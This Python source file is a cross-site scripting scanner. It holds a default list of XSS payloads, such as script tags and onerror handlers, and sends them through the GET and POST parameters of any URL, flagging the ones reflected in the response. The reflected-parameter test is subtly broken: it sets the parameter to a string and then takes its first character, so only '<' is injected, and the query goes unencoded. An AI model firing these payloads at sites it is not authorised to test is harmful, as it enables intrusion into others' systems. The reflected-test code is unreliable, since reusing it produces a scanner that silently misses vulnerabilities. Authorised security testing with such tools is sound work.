import os
import random
import requests
from colorama import Fore, Style
from urllib.parse import urlparse, parse_qs

def load_payloads(payload_file=None):
    default_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        'javascript:alert(1)',
        '<svg/onload=alert(1)>'
    ]
    
    if payload_file and os.path.exists(payload_file):
        with open(payload_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return default_payloads

def test_reflected_xss(url, payloads, verbose, output_file):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    
    if not query:
        print(f"{Fore.YELLOW}[!] No query parameters found for reflected XSS test{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}[*] Testing for reflected XSS in URL parameters...{Style.RESET_ALL}")
    
    for param in query:
        for payload in payloads:
            modified_query = query.copy()
            modified_query[param] = payload
            new_query = "&".join(f"{k}={v[0]}" for k,v in modified_query.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            try:
                response = requests.get(test_url)
                if payload in response.text:
                    msg = f"{Fore.GREEN}[+] Potential reflected XSS found in parameter: {param}{Style.RESET_ALL}"
                    msg += f"\nPayload: {payload}\nURL: {test_url}\n"
                    print(msg)
                    
                    if output_file:
                        output_file.write(msg + "\n")
                        
                    if verbose:
                        print(f"{Fore.BLUE}[*] Response (truncated):{Style.RESET_ALL}")
                        print(response.text[:500] + "...\n")
            except Exception as e:
                print(f"{Fore.RED}[!] Error testing {param}: {e}{Style.RESET_ALL}")

def test_post_xss(url, data, payloads, verbose, output_file):
    if not data:
        return
    
    print(f"{Fore.CYAN}[*] Testing for XSS in POST data...{Style.RESET_ALL}")
    
    # Parse the data string into a dictionary
    data_pairs = [pair.split('=') for pair in data.split('&')]
    post_data = {k: v for k, v in data_pairs}
    
    for param in post_data:
        original_value = post_data[param]
        
        for payload in payloads:
            modified_data = post_data.copy()
            modified_data[param] = payload
            
            try:
                response = requests.post(url, data=modified_data)
                if payload in response.text:
                    msg = f"{Fore.GREEN}[+] Potential XSS found in POST parameter: {param}{Style.RESET_ALL}"
                    msg += f"\nPayload: {payload}\nParameter value: {original_value}\n"
                    print(msg)
                    
                    if output_file:
                        output_file.write(msg + "\n")
                        
                    if verbose:
                        print(f"{Fore.BLUE}[*] Response (truncated):{Style.RESET_ALL}")
                        print(response.text[:500] + "...\n")
            except Exception as e:
                print(f"{Fore.RED}[!] Error testing {param}: {e}{Style.RESET_ALL}")

def scan(url, payload_file=None, post_data=None, verbose=False, output_file=None):
    payloads = load_payloads(payload_file)
    
    test_reflected_xss(url, payloads, verbose, output_file)
    
    if post_data:
        test_post_xss(url, post_data, payloads, verbose, output_file)